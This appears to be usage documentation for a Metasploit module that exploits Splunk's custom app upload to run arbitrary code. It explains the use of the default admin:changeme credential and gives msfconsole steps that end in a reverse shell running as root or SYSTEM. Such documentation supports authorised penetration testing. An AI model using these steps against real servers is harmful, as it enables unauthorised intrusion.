## Vulnerable Application

This module exploits a feature of Splunk whereby a custom application can be
uploaded through the web based interface. Through the \'script\' search command a
user can call commands defined in their custom application which includes arbitrary
perl or python code. To abuse this behavior, a valid Splunk user with the admin
role is required. By default, this module uses the credential of "admin:changeme",
the default Administrator credential for Splunk. Note that the Splunk web interface
runs as SYSTEM on Windows, or as root on Linux by default. This module has been
tested successfully against Splunk 5.0, 6.1, 6.1.1 and 7.2.4.
Version 7.2.4 has been tested successfully against OSX as well

## Verification Steps

  1. Start msfconsole
  2. Do: ```use exploit/multi/http/splunk_upload_app_exec```
  3. Set required variables (you will need admin credentials)
  4. Do: ```SET TARGET 1```
  5. Do: ```SET RHOST 192.168.1.1```
  6. Do: ```SET USERNAME admin```
  7. Do: ```SET PASSWORD changeme```
  8. You should get a reverse shell on port 4444 via the predefined handler.
